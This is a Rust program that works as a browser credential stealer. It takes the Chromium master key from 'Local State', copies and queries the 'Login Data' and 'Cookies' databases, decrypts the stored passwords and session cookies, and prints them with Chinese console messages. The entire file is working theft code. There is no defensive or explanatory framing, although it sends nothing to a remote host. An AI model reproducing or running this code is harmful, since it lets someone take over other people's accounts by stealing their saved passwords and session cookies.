mod crypto;
use rusqlite::{Connection, OpenFlags};
use std::{
    env,
    fs::{self},
    path::{Path, PathBuf},
};
use uuid::Uuid;

pub fn get_passwords() -> Vec<String> {
    let mut passwords = Vec::new();
    let master_key_path = Path::new("Local State").to_path_buf();

    let master_key = crypto::get_master_key(&master_key_path).unwrap();

    let login_data_path = "Login Data";

    let temp_env = std::env::temp_dir();

    let temp_path = temp_env.join(Uuid::new_v4().to_string());
    fs::copy(login_data_path, &temp_path).unwrap();

    let conn = Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

    let mut stmt = conn
        .prepare("SELECT origin_url, username_value, password_value FROM logins")
        .unwrap();

    let mut rows = stmt.query([]).unwrap();

    while let Some(row) = rows.next().unwrap() {
        let origin_url: String = row.get(0).unwrap();
        let username: String = row.get(1).unwrap();

        // let passwordss:String = row.get(2).unwrap();
        // passwordss = base64::decode(passwordss.unwrap());
        let password = crypto::aes_decrypt(row.get(2).unwrap(), &master_key);

        passwords.push(format!(
            "URL: {}\nUsername: {}\nPassword: {}\n",
            origin_url,
            username,
            std::str::from_utf8(&password).unwrap()
        ));
    }

    passwords
}
pub fn get_cookies() -> Vec<String> {
    let mut cookies = Vec::new();
    let master_key_path = Path::new("Local State").to_path_buf();

    let master_key = crypto::get_master_key(&master_key_path).unwrap();

    let cookies_path = "Cookies";

    let temp_env = std::env::temp_dir();

    let temp_path = temp_env.join(Uuid::new_v4().to_string());
    fs::copy(cookies_path, &temp_path).unwrap();

    let conn = Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

    let mut stmt = conn
        .prepare("SELECT host_key, name, encrypted_value FROM cookies")
        .unwrap();

    let mut rows = stmt.query([]).unwrap();

    while let Some(row) = rows.next().unwrap() {
        let host: String = row.get(0).unwrap();
        let name: String = row.get(1).unwrap();
        let value = crypto::aes_decrypt(row.get(2).unwrap(), &master_key);

        cookies.push(format!(
            "Host: {}\nValue: {}= {}\n",
            host,
            name,
            std::str::from_utf8(&value).unwrap()
        ));
    }

    drop(rows);
    stmt.finalize().unwrap();
    conn.close().unwrap();
    fs::remove_file(temp_path).unwrap();

    cookies
}
fn main() {
    // let passwords = get_passwords();
    // if !passwords.is_empty() {
    //     println!("开始输出浏览器中的密码\n");
    //     for line in passwords {
    //         println!("{}", line);
    //     }
    // }

    let cookies = get_cookies();
    if !cookies.is_empty() {
        println!("开始输出浏览器中的cookies\n");
        for line in cookies {
            println!("{}", line);
        }
    }
}
